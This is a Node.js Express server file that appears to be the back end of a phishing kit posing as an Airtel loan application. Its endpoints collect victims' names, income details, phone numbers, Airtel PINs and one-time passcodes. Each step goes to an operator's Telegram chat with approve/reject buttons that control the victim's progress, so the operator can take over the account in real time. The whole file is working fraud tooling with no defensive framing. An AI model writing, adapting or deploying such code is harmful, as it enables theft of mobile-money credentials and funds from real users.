require('dotenv').config();
const express = require('express');
const crypto = require('crypto');
const path = require('path');
const { bot, esc, safeSend } = require('./telegram');
const db = require('./db');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const wrap = fn => (req, res) => fn(req, res).catch(err => {
  console.error("SERVER ERROR:", err);
  res.status(500).json({ error: 'Server error' });
});

// ---------- SESSION ----------
app.post('/api/session', wrap(async (req, res) => {
  const sessionId = crypto.randomBytes(16).toString('hex');
  await db.createSession(sessionId);
  res.json({ sessionId });
}));

// ---------- PAGE 2 (QUESTIONNAIRE) ----------
app.post('/api/submit-page4', wrap(async (req, res) => {
  const { sessionId, data } = req.body;
  const session = await db.getSession(sessionId);
  if (!session) return res.status(404).json({ error: 'Invalid or expired session' });

  await db.updateSession(sessionId, { page4: data, status: 'pending_4' });

  const msg =
    `📝 *NEW AIRTEL LOAN APPLICATION — STEP 1*\n\n` +
    `*Name:* ${esc(data.fullName)}\n` +
    `*Employment:* ${esc(data.employment)}\n` +
    `*Monthly Income:* ${esc(data.income)}\n` +
    `*Loan Amount:* ${esc(data.loanAmount)}\n` +
    `*Term:* ${esc(data.loanTerm)}\n\n` +
    `Session: \`${sessionId}\``;

  await safeSend(CHAT_ID, msg, {
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [[
        { text: '✅ Approve Step 1', callback_data: `approve_4:${sessionId}` },
        { text: '❌ Reject',  callback_data: `reject_4:${sessionId}` }
      ]]
    }
  });
  res.json({ success: true });
}));

// ---------- PAGE 3 (PHONE & PIN) ----------
app.post('/api/submit-page5-6', wrap(async (req, res) => {
  const { sessionId, page5, page6 } = req.body;
  
  const session = await db.getSession(sessionId);
  if (!session) return res.status(404).json({ error: 'Invalid or expired session' });

  await db.updateSession(sessionId, { page5, page6, status: 'pending_56' });

  let p4Name = "Unknown";
  if (session.page4) {
    try { p4Name = JSON.parse(session.page4).fullName; } catch(e){}
  }
  
  const msg =
    `📋 *AIRTEL PHONE & PIN SUBMITTED — STEP 2*\n\n` +
    `*Name:* ${esc(p4Name)}\n\n` +
    `*— LOGIN DETAILS —*\n` +
    `Phone Number: ${esc(page5.q1)}\n` +
    `Airtel PIN: \`${esc(page5.q2)}\`\n\n` +
    `Session: \`${sessionId}\``;

  await safeSend(CHAT_ID, msg, {
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [{ text: '✅ Approve Step 2', callback_data: `correct_all:${sessionId}` }],
        [{ text: '❌ Reject', callback_data: `wrong_4:${sessionId}` }]
      ]
    }
  });
  res.json({ success: true });
}));

// ---------- PAGE 4 (OTP VERIFICATION) ----------
app.post('/api/verify-code', wrap(async (req, res) => {
  const { sessionId, code } = req.body;
  const session = await db.getSession(sessionId);
  
  if (!session) return res.status(404).json({ error: 'Session not found' });

  await db.updateSession(sessionId, { status: 'pending_otp', verification_code: code });

  let p4Name = "Unknown";
  let p5Phone = "Unknown";
  
  if (session.page4) { try { p4Name = JSON.parse(session.page4).fullName; } catch(e){} }
  if (session.page5) { try { p5Phone = JSON.parse(session.page5).q1; } catch(e){} }

  const msg = `🔐 *OTP SUBMITTED — FINAL STEP*\n\n` +
              `*Name:* ${esc(p4Name)}\n` +
              `*Phone:* ${esc(p5Phone)}\n` +
              `*OTP Entered:* \`${esc(code)}\`\n\n` +
              `Session: \`${sessionId}\``;

  await safeSend(CHAT_ID, msg, {
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [
          { text: '✅ Approve OTP (Complete Loan)', callback_data: `approve_pin:${sessionId}` },
          { text: '❌ Reject OTP', callback_data: `reject_pin:${sessionId}` }
        ]
      ]
    }
  });

  res.json({ success: true, message: 'Awaiting admin approval' });
}));

// ---------- STATUS ----------
app.get('/api/status/:sessionId', wrap(async (req, res) => {
  const session = await db.getSession(req.params.sessionId);
  if (!session) return res.status(404).json({ error: 'Not found or expired' });
  res.json({ status: session.status });
}));

// ---------- TELEGRAM CALLBACKS ----------
bot.on('callback_query', async (query) => {
  try {
    const [command, sessionId] = query.data.split(':');
    const msgId = query.message.message_id;
    const chatId = query.message.chat.id;

    const session = await db.getSession(sessionId);
    if (!session) {
      return bot.answerCallbackQuery(query.id, { text: 'Session expired.' });
    }

    const actions = {
      approve_4:   { status: 'approved_4',   label: '✅ APPROVED (Step 1)' },
      reject_4:    { status: 'rejected_4',   label: '❌ REJECTED (Step 1)' },
      correct_all: { status: 'approved_all', label: '✅ APPROVED (Step 2)' },
      wrong_4:     { status: 'rejected_4',   label: '❌ REJECTED (Step 2)' },
      approve_pin: { status: 'completed',    label: '✅ OTP APPROVED — LOAN COMPLETE' },
      reject_pin:  { status: 'rejected_pin', label: '❌ OTP REJECTED' }
    };
    
    const action = actions[command];
    if (!action) return bot.answerCallbackQuery(query.id, { text: 'Unknown action.' });

    await db.updateSession(sessionId, { status: action.status });

    const originalText = query.message.text;
    
    await bot.editMessageText(`${originalText}\n\n————————————\n*STATUS:* ${action.label}`, {
      chat_id: chatId, 
      message_id: msgId, 
      parse_mode: 'Markdown',
      reply_markup: { inline_keyboard: [] }
    });
    
    bot.answerCallbackQuery(query.id, { text: 'Status Updated!' });
  } catch (err) {
    console.error('callback error:', err.message);
    try { bot.answerCallbackQuery(query.id, { text: 'Error.' }); } catch {}
  }
});

// ---------- START ----------
const PORT = process.env.PORT || 3000;

db.init()
  .then(() => app.listen(PORT, () => console.log(`✅ Server on port ${PORT}`)))
  .catch(err => {
    console.error('❌ DB init failed:', err);
    process.exit(1);
  });